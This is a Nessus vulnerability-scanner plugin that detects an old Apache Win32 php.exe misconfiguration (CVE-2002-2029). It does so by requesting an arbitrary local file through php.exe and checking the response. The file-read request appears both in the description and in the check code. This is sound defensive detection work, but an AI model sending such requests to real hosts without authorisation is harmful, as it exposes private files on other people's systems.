#
# This script was written by Matt Moore <matt.moore@westpoint.ltd.uk>
#
# See the Nessus Scripts License for details
#

# Changes by Tenable:
# - Revised plugin title, added OSVDB ref, removed francais (3/30/2009)


include("compat.inc");

if(description)
{
 script_id(10839);
 script_version ("$Revision: 1.14 $");
 script_cve_id("CVE-2002-2029");
 script_bugtraq_id(3786);
 script_xref(name:"OSVDB", value:"701");

 script_name(english:"Apache Win32 ScriptAlias php.exe Arbitrary File Access");
 
 script_set_attribute(attribute:"synopsis", value:
"Arbitrary files may be read on the remote host." );
 script_set_attribute(attribute:"description", value:
"A configuration vulnerability exists for PHP.EXE cgi running on Apache 
for Win32 platforms. It is reported that the installation text recommends 
configuration options in httpd.conf that create a security vulnerability, 
allowing arbitrary files to be read from the host running PHP. Remote users 
can directly execute the PHP binary:

http://www.somehost.com/php/php.exe?c:\winnt\win.ini" );
 script_set_attribute(attribute:"solution", value:
"Obtain the latest version from http://www.php.net" );
 script_set_attribute(attribute:"see_also", value:"http://www.securitytracker.com/alerts/2002/Jan/1003104.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.php.net" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );

script_end_attributes();

 
 script_summary(english:"Tests for PHP.EXE / Apache Win32 Arbitrary File Reading Vulnerability");
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2002-2009 Matt Moore");
 script_family(english:"CGI abuses");
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

# Check starts here

include("http_func.inc");

port = get_http_port(default:80);

if(get_port_state(port))
{ 	      
 if ( ! can_host_php(port:port) ) exit(0);
 req = http_get(item:"/php/php.exe?c:\winnt\win.ini", port:port);
 soc = http_open_socket(port);
 if(soc)
 {
 send(socket:soc, data:req);
 r = http_recv(socket:soc);
 http_close_socket(soc);
 if("[windows]" >< r)	
 	security_warning(port);

 }
}
